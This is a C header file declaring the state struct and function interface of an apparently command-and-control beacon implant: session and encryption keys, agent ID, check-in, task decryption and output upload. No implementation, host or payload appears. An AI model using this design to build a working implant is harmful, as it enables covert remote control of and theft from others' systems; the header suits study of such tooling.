#ifndef BEACON_H
#define BEACON_H

#include <stdint.h>
#include <stddef.h>
#include "profile.h"

typedef struct {
    char session_key[16];
    uint8_t aes_key[16];
    uint8_t hmac_key[16];
    uint8_t aes_iv[16];
    uint32_t agent_id;

    uint32_t last_server_time;
    uint32_t upload_counter;

    int connected;
    char *pending_tasks;
    size_t tasks_len;
    char *output_buffer;
    size_t output_len;

    c2_profile_t profile;
} beacon_state_t;

// Function declarations
int beacon_init(beacon_state_t *state);
int beacon_checkin(beacon_state_t *state);
int beacon_send_output(beacon_state_t *state, const char *output, size_t len);
void beacon_cleanup(beacon_state_t *state);
void beacon_sleep(void);

// Metadata generation - updated signature
uint8_t* beacon_generate_metadata(beacon_state_t *state, size_t *out_len);

// Task decryption
int beacon_decrypt_tasks(beacon_state_t *state, const uint8_t *ciphertext, size_t ciphertext_len,
                         uint8_t **plaintext_out, size_t *plaintext_len_out);

#endif // BEACON_H
